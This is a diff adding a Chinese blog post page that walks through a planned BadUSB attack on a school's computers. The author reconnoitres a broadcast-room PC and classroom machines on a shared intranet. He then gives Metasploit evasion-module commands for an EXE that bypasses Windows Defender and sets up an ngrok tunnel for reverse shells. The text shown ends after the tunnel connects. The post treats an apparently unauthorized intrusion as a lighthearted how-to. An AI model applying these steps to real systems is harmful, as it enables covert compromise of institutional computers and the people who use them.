@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>携Badusb进校园的系列测试 - Scan&#39;s Blog</title><meta name="author" content="Scan">
+<meta name="author-link" content="https://www.scan.work/">
+<meta name="description" content="" /><meta name="keywords" content='物理硬件' />
+  <meta itemprop="name" content="携Badusb进校园的系列测试">
+  <meta itemprop="datePublished" content="2023-05-27T09:56:07+08:00">
+  <meta itemprop="dateModified" content="2023-05-27T09:56:07+08:00">
+  <meta itemprop="wordCount" content="243">
+  <meta itemprop="keywords" content="物理硬件"><meta property="og:url" content="https://hack-scan.github.io/posts/badusb/">
+  <meta property="og:site_name" content="Scan&#39;s Blog">
+  <meta property="og:title" content="携Badusb进校园的系列测试">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-05-27T09:56:07+08:00">
+    <meta property="article:modified_time" content="2023-05-27T09:56:07+08:00">
+    <meta property="article:tag" content="物理硬件">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="携Badusb进校园的系列测试">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://hack-scan.github.io/posts/badusb/" /><link rel="prev" href="https://hack-scan.github.io/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/" /><link rel="next" href="https://hack-scan.github.io/posts/chromedriver%E5%AE%89%E8%A3%85/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "携Badusb进校园的系列测试",
+    "inLanguage": "zh-cn",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/hack-scan.github.io\/posts\/badusb\/"
+    },"genre": "posts","keywords": "物理硬件","wordcount":  243 ,
+    "url": "https:\/\/hack-scan.github.io\/posts\/badusb\/","datePublished": "2023-05-27T09:56:07+08:00","dateModified": "2023-05-27T09:56:07+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Scan"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Scan&#39;s Blog"><span class="header-title-text">Scan&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/life/"
+                
+                
+              ><i class="fa-solid fa-camera-alt fa-fw fa-sm" aria-hidden="true"></i> 生活</a></li><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/projects/"
+                          title="我的作品集"
+                          
+                        ><i class="fa-solid fa-laptop-code fa-fw fa-sm" aria-hidden="true"></i> 我的作品</a>
+                      </li></ul></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Scan&#39;s Blog"><span class="header-title-text">Scan&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/life/"
+                  
+                  
+                ><i class="fa-solid fa-camera-alt fa-fw fa-sm" aria-hidden="true"></i> 生活</a></li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/about/"
+                    
+                    
+                  ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/projects/"
+                          title="我的作品集"
+                          
+                        ><i class="fa-solid fa-laptop-code fa-fw fa-sm" aria-hidden="true"></i> 我的作品</a>
+                      </li></ul></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>携Badusb进校园的系列测试</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://www.scan.work/" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/logo.png?size=large" alt="Scan" data-title="Scan" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Scan</a></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/" class="post-category" title="分类 - 近源渗透"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 近源渗透</a></span></div><div class="post-meta-line"><span title="发布于 2023-05-27 09:56:07"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-05-27">2023-05-27</time></span>&nbsp;<span title="243 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 2 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#本文所用到的工具"><strong>本文所用到的工具</strong>：</a></li>
+    <li><a href="#蓄谋已久的前言"><strong>蓄谋已久的前言</strong>：</a></li>
+    <li><a href="#分析并整理收集到的信息"><strong>分析并整理收集到的信息</strong></a></li>
+    <li><a href="#部署payload及规避模块到ngrok"><strong>部署Payload及规避模块到Ngrok</strong></a></li>
+    <li><a href="#安装arduino"><strong>安装Arduino</strong></a></li>
+    <li><a href="#烧录代码"><strong>烧录代码</strong></a></li>
+    <li><a href="#shell快到碗里来"><strong>Shell快到碗里来</strong></a></li>
+    <li><a href="#内网漫游"><strong>内网漫游</strong></a></li>
+    <li><a href="#总结"><strong>总结</strong></a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="本文所用到的工具" class="heading-element"><span><strong>本文所用到的工具</strong>：</span>
+  <a href="#%e6%9c%ac%e6%96%87%e6%89%80%e7%94%a8%e5%88%b0%e7%9a%84%e5%b7%a5%e5%85%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>l <strong>Badusb</strong></p>
+<p>l <strong>Ngrok</strong></p>
+<p>l <strong>Arduino</strong></p>
+<p>l <strong>Msfconsole</strong></p>
+<p>l <strong>Msfvenom</strong></p>
+<p>l <strong>迷你相机</strong></p>
+<h2 id="蓄谋已久的前言" class="heading-element"><span><strong>蓄谋已久的前言</strong>：</span>
+  <a href="#%e8%93%84%e8%b0%8b%e5%b7%b2%e4%b9%85%e7%9a%84%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>每次上楼时，都能看见广播室门开得非常宽，</p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002790.jpg" alt="图片1" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002790.jpg?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002790.jpg?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002790.jpg?size=large 2x" data-title="图片1" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>但这不是重点，重点是里面的电脑（<strong><strong>Windows XP</strong></strong>），电脑桌面上是<strong><strong>LED</strong></strong>大屏幕的编辑软件。</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002109.png" alt="image-20230527100239072" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002109.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002109.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002109.png?size=large 2x" data-title="image-20230527100239072" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>二楼有个网络管理箱并由管道内的网线传输到每个教室的多媒体（<strong><strong>Windows 10</strong></strong>）。</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002388.png" alt="image-20230527100252356" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002388.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002388.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002388.png?size=large 2x" data-title="image-20230527100252356" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>看看兜里的<strong><strong>Badusb</strong></strong>，突然就散发出了浓浓的香味，哧溜。</p>
+<p><strong>俗话说“艺高人胆大”，但吾也要：武艺不高强，菜鸟也先飞！</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003372.png" alt="image-20230527100304344" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003372.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003372.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003372.png?size=large 2x" data-title="image-20230527100304344" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="分析并整理收集到的信息" class="heading-element"><span><strong>分析并整理收集到的信息</strong></span>
+  <a href="#%e5%88%86%e6%9e%90%e5%b9%b6%e6%95%b4%e7%90%86%e6%94%b6%e9%9b%86%e5%88%b0%e7%9a%84%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><table>
+<thead>
+<tr>
+<th><strong>主机</strong></th>
+<th><strong>系统</strong></th>
+<th><strong>杀毒软件</strong></th>
+<th><strong>网络状态</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>广播室</strong></td>
+<td><strong>Windows XP</strong></td>
+<td><strong>不详</strong></td>
+<td><strong>不详</strong></td>
+</tr>
+<tr>
+<td><strong>多媒体</strong></td>
+<td><strong>Windows 10</strong></td>
+<td><strong>Defender</strong>**、360</td>
+<td><strong>正常</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>而且我们从二楼的网络管理箱分支网线的管道可推断出二楼所有教师的多媒体属于同一内网。我们在烧录代码的时候，就要根据不同的系统版本，网络状态，杀毒软件等因素来进行烧录。为什么说广播室的具体信息我们获取不到呢？因为“可远观，而不可亵玩焉。”</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003957.png" alt="image-20230527100334923" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003957.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003957.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003957.png?size=large 2x" data-title="image-20230527100334923" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="部署payload及规避模块到ngrok" class="heading-element"><span><strong>部署Payload及规避模块到Ngrok</strong></span>
+  <a href="#%e9%83%a8%e7%bd%b2payload%e5%8f%8a%e8%a7%84%e9%81%bf%e6%a8%a1%e5%9d%97%e5%88%b0ngrok" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>首先我们使用规避模块生成一个</strong>Windows EXE<strong>文件来规避</strong>Windwos Defender<strong>程序，操作如下：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">show evasuibd</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003408.png" alt="image-20230527100354377" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003408.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003408.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003408.png?size=large 2x" data-title="image-20230527100354377" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">use windows/windows_defender_exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">show options</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005210.png" alt="image-20230527100506186" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005210.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005210.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005210.png?size=large 2x" data-title="image-20230527100506186" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>接着run</strong> <strong>可以看到生成的<strong><strong>FILE NAME</strong></strong>（文件名是随机的）</strong></p>
+<p><strong>当然也可以自定义</strong> <strong>Set FILENAME</strong> <strong>文件名即可</strong></p>
+<p><strong>生成的文件保存到了</strong></p>
+<pre tabindex="0"><code>/root/.msf4/local/yZdsypg.exe</code></pre><p><strong>接下来我们来部署反弹环境</strong></p>
+<p><strong>在</strong><a href="http://www.ngrok.cc"target="_blank" rel="external nofollow noopener noreferrer">这里</a><strong>来注册一个账户</strong></p>
+<p><strong>登录后来到后台页面点击</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005800.png" alt="image-20230527100520777" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005800.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005800.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005800.png?size=large 2x" data-title="image-20230527100520777" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>当然也有免费的隧道，不过网速较慢，根据自己的情况而定！</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005258.png" alt="image-20230527100534238" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005258.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005258.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005258.png?size=large 2x" data-title="image-20230527100534238" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>接着我们点击立即购买，会跳转到隧道配置的页面，如图：</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005575.png" alt="image-20230527100544553" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005575.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005575.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005575.png?size=large 2x" data-title="image-20230527100544553" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>使用</strong>ping<strong>服务器地址命令，找到</strong>IP<strong>地址。</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005816.png" alt="image-20230527100556789" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005816.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005816.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005816.png?size=large 2x" data-title="image-20230527100556789" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>接着我们打开刚解压下来的文件夹</strong></p>
+<p><strong>输入</strong>./sunny clientid <strong>填写你的隧道ID</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006535.png" alt="image-20230527100606509" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006535.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006535.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006535.png?size=large 2x" data-title="image-20230527100606509" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>出现这个界面就代表隧道连接成功！</strong></p>
